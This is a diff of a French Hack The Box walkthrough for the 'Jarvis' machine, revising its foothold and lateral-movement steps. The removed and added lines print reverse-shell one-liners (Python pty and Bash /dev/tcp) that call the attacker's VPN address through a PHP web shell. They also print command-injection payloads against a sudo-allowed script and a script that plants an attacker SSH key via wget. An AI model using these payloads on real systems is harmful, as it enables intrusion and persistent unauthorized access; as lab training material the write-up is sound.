@@ -1395,160 +1395,113 @@ La prochaine étape consiste à l’utiliser pour déclencher un reverse shell v
 
 #### Établissement de la connexion
 
-Le mini shell PHP permet désormais d’exécuter ponctuellement des commandes sur le serveur. Cet accès reste toutefois peu pratique, car chaque commande doit être transmise dans le paramètre `command` de l’URL.
-
-Tu vas donc l’utiliser pour établir un reverse shell vers ta machine Kali.
-
-Tu commences par ouvrir un port d’écoute sur Kali avec `netcat`. L’utilisation de `rlwrap` améliore le comportement du terminal et permet notamment de conserver un historique des commandes :
+Dans un premier terminal, tu ouvres un listener avec `netcat` :
 
 ```bash
-rlwrap -cAr nc -lvnp 4444
+nc -lvnp 4444
 ```
 
-Tu utilises un reverse shell Python qui lance `/bin/bash` avec `pty.spawn()` :
+Tu vérifies ensuite l’adresse IP de ton interface VPN :
 
 ```bash
-python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.x.x",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
+ip -br addr show tun0
 ```
 
-Cette commande :
-
-- ouvre une connexion vers l’adresse de ton interface VPN `tun0` sur le port `4444` ;
-- redirige les entrées et sorties standards vers la socket ;
-- lance `/bin/bash` dans un pseudo-terminal avec `pty.spawn()`.
-
-Comme elle contient plusieurs guillemets et caractères spéciaux susceptibles d’être mal interprétés dans une URL, tu l’encodes en Base64 depuis Kali :
+Depuis un second terminal, tu déclenches un reverse shell Bash en remplaçant `10.10.x.x` par cette adresse :
 
 ```bash
-printf '%s' 'python3 -c '\''import socket,os,pty;s=socket.socket();s.connect(("10.10.x.x",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'\''' | base64 -w0
+curl -G \
+  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'" \
+  http://jarvis.htb/shell.php
 ```
 
-Tu obtiens ainsi une chaîne Base64 représentant la commande complète. Dans la suite, elle sera simplement désignée par :
+Le listener reçoit alors la connexion :
 
 ```text
-CHAINE_BASE64
-```
-
-Tu demandes ensuite au mini shell PHP de décoder puis d’exécuter cette chaîne.
-
-Pour cela, tu saisis directement dans le navigateur une URL construite sur le modèle suivant :
-
-```text
-http://jarvis.htb/shell.php?command=echo%20%27CHAINE_BASE64%27%20%7C%20base64%20-d%20%7C%20bash
-```
-
-Le paramètre `command` correspond à la commande suivante, encodée afin de pouvoir être correctement transmise dans l’URL :
-
-```bash
-echo 'CHAINE_BASE64' | base64 -d | bash
-```
-
-Le listener reçoit alors une connexion provenant de Jarvis :
-
-```text
-rlwrap -cAr nc -lvnp 4444
 listening on [any] 4444 ...
-connect to [10.10.x.x] from (UNKNOWN) [10.129.43.56] 40638
+connect to [10.10.x.x] from (UNKNOWN) [10.129.x.x] 33926
+bash: cannot set terminal process group (663): Inappropriate ioctl for device
+bash: no job control in this shell
 www-data@jarvis:/var/www/html$
 ```
 
-Le prompt apparaît immédiatement. Tu vérifies que le shell est bien associé à un pseudo-terminal :
-
-```bash
-tty
-```
-
-La commande retourne :
-
-```text
-/dev/pts/2
-```
-
-Tu contrôles ensuite l’identité du compte utilisé, ses groupes ainsi que le répertoire de travail courant :
+Tu vérifies l’identité du compte utilisé et le répertoire courant :
 
 ```bash
 whoami
 id
 pwd
-```
-
-Les commandes retournent :
-
-```text
 www-data
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /var/www/html
 ```
 
-Ces résultats confirment que le reverse shell a bien été établi avec les privilèges du compte `www-data`, que tu te trouves dans la racine web de l’application et que le shell dispose d’un pseudo-terminal.
+Le reverse shell est bien établi avec les privilèges de `www-data`, mais il ne dispose pas encore d’un terminal pleinement interactif.
 
 #### Stabilisation du reverse shell
 
-Le reverse shell dispose déjà d’un pseudo-terminal grâce à `pty.spawn()`. Il reste néanmoins utile d’ajuster le terminal afin d’obtenir un comportement plus confortable et plus fiable.
-
-Tu définis d’abord un type de terminal compatible :
+Le reverse shell obtenu reste rudimentaire. Tu appliques donc la procédure classique de stabilisation avec Python :
 
 ```bash
-export TERM=xterm
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Tu suspends ensuite temporairement le reverse shell avec :
-
-```text
-Ctrl+Z
-```
-
-De retour dans le terminal Kali, tu désactives l’écho local et replaces le listener au premier plan :
+Tu suspends ensuite le shell avec `Ctrl+Z`, puis, depuis Kali :
 
 ```bash
-stty raw -echo; fg
+stty raw -echo
+fg
 ```
 
-Après avoir appuyé sur `Entrée`, tu réinitialises le terminal depuis Jarvis :
+Après avoir appuyé sur `Entrée`, tu réinitialises le terminal :
 
 ```bash
 reset
 ```
 
-Tu complètes enfin l’environnement du shell :
+Tu indiques `xterm`, puis tu définis la variable correspondante :
 
 ```bash
-export SHELL=/bin/bash
 export TERM=xterm
+```
+
+Tu peux enfin adapter la taille du terminal :
+
+```bash
 stty rows 40 columns 120
 ```
 
-Le reverse shell est maintenant suffisamment stable pour poursuivre l’énumération locale et interagir correctement avec les programmes qui attendent une saisie.
+Le reverse shell est désormais suffisamment stable pour interagir correctement avec les programmes qui demandent une saisie.
 
-La procédure est basée sur la recette dédiée :
+La procédure complète est détaillée dans la recette dédiée :
 
 {{< recette "stabiliser-reverse-shell" >}}
 
 ### Recherche d’un passage vers un utilisateur local
 
-Après avoir obtenu un shell en tant que `www-data`, tu examines les répertoires personnels présents sur la machine afin d’identifier les utilisateurs locaux :
+Après avoir obtenu un shell en tant que `www-data`, tu examines les répertoires personnels présents sur la machine :
 
 ```bash
 ls -l /home
 ```
 
-La sortie révèle notamment l’existence du répertoire suivant :
+La sortie révèle notamment le répertoire de l’utilisateur `pepper` :
 
 ```text
 /home/pepper
 ```
 
-Tu peux également constater que le fichier `user.txt`, correspondant au premier objectif de la machine, se trouve dans ce répertoire :
+Tu constates également que le fichier `user.txt` se trouve dans ce répertoire :
 
 ```text
 /home/pepper/user.txt
 ```
 
-Le compte `pepper` devient donc une cible logique pour la suite de l’exploitation. Il faut maintenant rechercher un moyen de quitter le contexte limité de `www-data` et d’exécuter des commandes avec les privilèges de cet utilisateur.
+Le compte `pepper` devient donc une cible logique. Tu dois maintenant rechercher un moyen d’exécuter des commandes avec les privilèges de cet utilisateur.
 
 #### Consultation des permissions sudo de `www-data`
 
-Tu commences par consulter les permissions `sudo` accordées au compte courant :
+Tu consultes les permissions `sudo` accordées au compte courant :
 
 ```bash
 sudo -l
@@ -1565,21 +1518,19 @@ User www-data may run the following commands on jarvis:
     (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
 ```
 
-Cette sortie révèle que `www-data` est autorisé à exécuter le script suivant avec les privilèges de l’utilisateur `pepper` :
+Cette sortie indique que `www-data` peut exécuter le script suivant avec les privilèges de `pepper`, sans fournir de mot de passe :
 
 ```text
 /var/www/Admin-Utilities/simpler.py
 ```
 
-La directive `NOPASSWD` indique qu’aucun mot de passe n’est demandé pour lancer cette commande.
-
-L’autorisation ne permet pas d’exécuter le script en tant que `root`, mais uniquement en tant que `pepper`. La commande doit donc préciser explicitement cet utilisateur :
+Il faut donc préciser explicitement cet utilisateur lors de l’exécution :
 
 ```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py
 ```
 
-Ce script constitue désormais la piste principale pour obtenir un accès en tant que `pepper` et atteindre le fichier `user.txt`.
+Ce script constitue désormais la piste principale pour passer de `www-data` à `pepper`.
 
 #### Analyse du fonctionnement du script `simpler.py`
 
@@ -1843,59 +1794,149 @@ Le programme affiche alors :
 Enter an IP:
 ```
 
-Le reverse shell utilisé doit toutefois disposer d’un pseudo-terminal fonctionnel. Dans le cas contraire, le script peut recevoir immédiatement une ligne vide ou ne pas permettre l’interaction correcte avec le shell lancé ensuite.
-
-Après avoir obtenu un terminal associé à un périphérique de type `/dev/pts`, tu fournis la saisie suivante :
+Tu fournis la saisie suivante :
 
 ```bash
-$(bash </dev/tty >/dev/tty)
+$(id)
 ```
 
-La commande construite par le script devient alors équivalente à :
+Le script construit alors une commande équivalente à :
 
 ```bash
-ping $(bash </dev/tty >/dev/tty)
+ping $(id)
 ```
 
-Avant d’exécuter `ping`, le shell interprète la substitution de commandes et lance un nouveau processus Bash.
+La commande `id` est d’abord exécutée par le shell. Sa sortie remplace ensuite l’expression `$(id)` dans la commande transmise à `ping`.
 
-La redirection :
+La commande devient donc, en pratique, quelque chose de proche de :
 
 ```text
-</dev/tty
+ping uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
 ```
 
-permet à ce nouveau shell de lire les commandes saisies au clavier, tandis que :
+Comme cette valeur n’est pas une adresse IP valide, `ping` tente d’interpréter certains éléments comme des noms d’hôtes et finit par afficher une erreur :
 
 ```text
->/dev/tty
+ping: groups=1000(pepper): Temporary failure in name resolution
 ```
 
-redirige sa sortie directement vers le terminal courant.
+Ce message est particulièrement révélateur : la chaîne `groups=1000(pepper)` provient directement de la sortie de `id`. Cela confirme que la commande a bien été exécutée avec les privilèges de l’utilisateur `pepper`.
 
-Comme `simpler.py` a été lancé avec `sudo -u pepper`, le processus Bash hérite des privilèges de cet utilisateur.
+L’injection de commandes est donc validée. La liste noire du script reste insuffisante, car elle ne bloque pas la substitution de commandes avec `$()`.
 
-Tu vérifies alors le nouveau contexte d’exécution :
+Il reste maintenant à exploiter cette faiblesse pour exécuter une commande plus utile sous l’identité de `pepper`.
+
+#### Installation d’une clé SSH pour l’utilisateur `pepper`
+
+L’injection de commandes permet désormais d’exécuter des instructions avec les privilèges de `pepper`. Plutôt que de conserver un shell limité, tu vas utiliser cette possibilité pour installer une clé SSH dans son répertoire personnel et obtenir une session complète.
+
+Depuis ton répertoire de travail sur Kali, tu génères une paire de clés dédiée à Jarvis :
 
 ```bash
+ssh-keygen -t ed25519 -f pepper_jarvis -C 'pepper@jarvis' -N ''
+```
+
+Deux fichiers sont créés :
+
+```text
+pepper_jarvis
+pepper_jarvis.pub
+```
+
+La clé privée reste sur Kali. La clé publique doit être placée dans le fichier suivant sur Jarvis :
+
+```text
+/home/pepper/.ssh/authorized_keys
+```
+
+Pour simplifier son transfert, tu démarres un petit serveur HTTP depuis le répertoire contenant la clé publique :
+
+```bash
+python3 -m http.server 8000
+```
+
+Depuis le reverse shell, tu crées ensuite un script chargé d’installer cette clé. Tu remplaces `10.10.x.x` par l’adresse IP de ton interface VPN `tun0` :
+
+```bash
+cat > /tmp/install_pepper_key.sh <<'EOF'
+#!/bin/sh
+
+mkdir -p /home/pepper/.ssh
+chmod 700 /home/pepper/.ssh
+
+wget -qO /home/pepper/.ssh/authorized_keys \
+  http://10.10.x.x:8000/pepper_jarvis.pub
+
+chmod 600 /home/pepper/.ssh/authorized_keys
+EOF
+```
+
+Tu rends le script exécutable :
+
+```bash
+chmod 755 /tmp/install_pepper_key.sh
+```
+
+Il reste à le faire exécuter par `pepper` grâce à l’injection identifiée dans `simpler.py` :
+
+```bash
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+```
+
+À l’invite, tu saisis :
+
+```bash
+$(/tmp/install_pepper_key.sh)
+```
+
+Le script est alors exécuté avec les privilèges de `pepper`. Il crée son répertoire `.ssh`, télécharge la clé publique et applique les permissions attendues.
+
+Tu peux vérifier les fichiers créés :
+
+```bash
+ls -ld /home/pepper/.ssh
+ls -l /home/pepper/.ssh/authorized_keys
+```
+
+Les permissions doivent être semblables à :
+
+```text
+drwx------ pepper pepper /home/pepper/.ssh
+-rw------- pepper pepper /home/pepper/.ssh/authorized_keys
+```
+
+Depuis Kali, tu sécurises la clé privée :
+
+```bash
+chmod 600 pepper_jarvis
+```
+
+Tu peux ensuite ouvrir une session SSH en tant que `pepper` :
+
+```bash
+ssh -i pepper_jarvis pepper@jarvis.htb
+```
+
+Après validation de l’empreinte du serveur, tu obtiens une session complète :
+
+```text
+pepper@jarvis:~$
+```
+
+Tu vérifies le contexte d’exécution :
+
+```bash
+whoami
 id
-```
-
-La commande retourne :
-
-```text
+tty
+pwd
+pepper
 uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
+/dev/pts/0
+/home/pepper
 ```
 
-Le prompt confirme également le changement d’utilisateur :
-
-```text
-pepper@jarvis:/var/www/html$
-```
-
-L’injection de commandes est donc validée. La liste noire du script est insuffisante, car elle ne bloque pas la substitution de commandes avec `$()`.
-
-L’ajout des redirections vers `/dev/tty` permet en outre d’obtenir un shell réellement interactif en tant que `pepper`.
+Tu disposes désormais d’une véritable session SSH en tant que `pepper`, avec un terminal pleinement interactif. Cette session constitue un point de départ plus fiable pour poursuivre l’énumération locale et rechercher une élévation de privilèges vers `root`.
 
 #### Lecture de `user.txt`
 
